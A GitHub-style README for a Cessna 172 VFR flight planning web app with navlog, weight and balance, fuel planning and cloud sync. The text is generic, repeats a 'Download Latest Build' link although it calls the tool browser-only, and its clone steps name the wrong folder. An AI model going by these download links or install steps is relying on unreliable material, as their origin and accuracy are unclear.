# C172 Flugplanung v2026 - VFR flight planning tool 2026

> **C172 Flugplanung is a browser-based VFR planning application built around the Cessna 172. Version 2026 unites navlog, weight and balance, fuel, and performance planning in one place.**

[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/hughesjan37/c172-flugplanung-vfr-2026?style=flat-square)](https://github.com/hughesjan37/c172-flugplanung-vfr-2026)

---

<p align="center">
  <a href="https://hughesjan37.github.io/c172-flugplanung-vfr-2026/">
    <img src="https://img.shields.io/badge/Download-C172%20Flugplanung%20Latest-brightgreen?style=for-the-badge" alt="Download C172 Flugplanung">
  </a>
</p>

> **[Download - C172 Flugplanung v2026](https://hughesjan37.github.io/c172-flugplanung-vfr-2026/)**

---

[Download Latest Build](https://hughesjan37.github.io/c172-flugplanung-vfr-2026/)

---

## About C172 Flugplanung

C172 Flugplanung targets VFR trip preparation with the Cessna 172 as its reference aircraft. Rather than spreading the work across separate utilities, it gathers the planning steps pilots commonly perform into a single web app, so route data, loading, fuel, and aircraft performance stay organized within one workflow.

Because access is login-backed and plans sync through the cloud, the tool fits pilots who prefer a browser-based planning surface. Planning sessions remain reachable across devices through a Firebase Auth-enabled experience.

---

## Features

- Navlog support for route preparation and flight planning
- Weight and balance calculations tailored to Cessna 172 operations
- Fuel planning for trip preparation and endurance checks
- Performance planning to help estimate aircraft operating needs
- Cloud synchronization that keeps plans available across devices
- Authenticated access with a required login
- Browser-based interface, no local app installation needed
- Structured around VFR flight planning workflows

---

## Installation

Download the project files or clone the repository, then load the web app in a browser.

git clone https://github.com/hughesjan37/c172-flugplanung-vfr-2026.git
cd c172-flugplanung

When hosting locally, launch the app through your usual static web server or development workflow for HTML-based projects.

---

## Usage

1. Log in through the application's sign-in flow.
2. Open a new VFR planning session for the Cessna 172.
3. Build the navlog by entering your route details.
4. Add loading, fuel, and performance data where required.
5. Check the planning results, then pick up editing on another device when cloud sync is active.

If you plan regularly, stay on the same account so your synced data remains available on every supported device.

---

## Configuration

Saved planning data and settings live within the web application and its authenticated cloud workflow.

Environment-dependent items typically include:
- Firebase Auth configuration
- Cloud synchronization settings
- Stored planning records and user session data

Should your deployment rely on local configuration files, keep them alongside the other web app assets and adjust them to match your environment.

---

## Requirements

- A web browser
- Internet access for login and cloud sync
- Firebase Auth support for authenticated access
- A hosting setup for the web application
- Storage for saved planning data when deployed with persistent sync features

---

## FAQ

### Is an account required?
Yes. Access to the application is login-based.

### Can I plan on more than one device?
Yes. Cloud synchronization is included for cross-device use.

### Which planning tasks are covered?
Navlog planning, weight and balance, fuel planning, and performance planning.

### How do I get the newest version?
Follow the latest build link above to reach the current release.

### What should I check if login or sync fails?
Review the browser session, network connectivity, and the Firebase Auth configuration used by your deployment.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
